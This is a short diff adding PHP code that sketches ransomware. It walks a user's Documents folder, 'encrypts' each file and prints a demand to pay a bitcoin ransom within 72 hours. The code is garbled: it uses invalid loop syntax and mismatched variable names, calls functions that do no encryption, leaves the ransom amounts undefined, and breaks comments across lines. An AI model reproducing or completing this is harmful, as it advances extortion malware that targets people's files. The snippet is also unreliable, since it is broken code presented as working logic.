@@ -1,0 +1,21 @@
+$f = 'C:\Users\User\Documents'; //path to files
+$a = 0; //starting point for encryption keys
+for($i=1; $i<=256; $i++) {
+ if (rand(0,1) == 0) {
+ $encryptionKey = substr($f, $i, 3);
+ break;
+ } else {
+ $encryptionKey = 'random-key';
+ break;
+ }
+}
+foreach ($files in glob("$f/*")) {
+ if (is_file($file)) {
+ $encryptedFile = base64_encode(openssl_get_privatekey($file)); //encrypt 
+file contents using encryption key
+ $fileName = basename($file); //remove extension from filename to use as 
+encrypted file name
+ echo "Attention! Your files have been encrypted. To get your files back, 
+please pay the ransom of $X dollars ($$Y in bitcoin) within 72 hours.";
+ }
+}
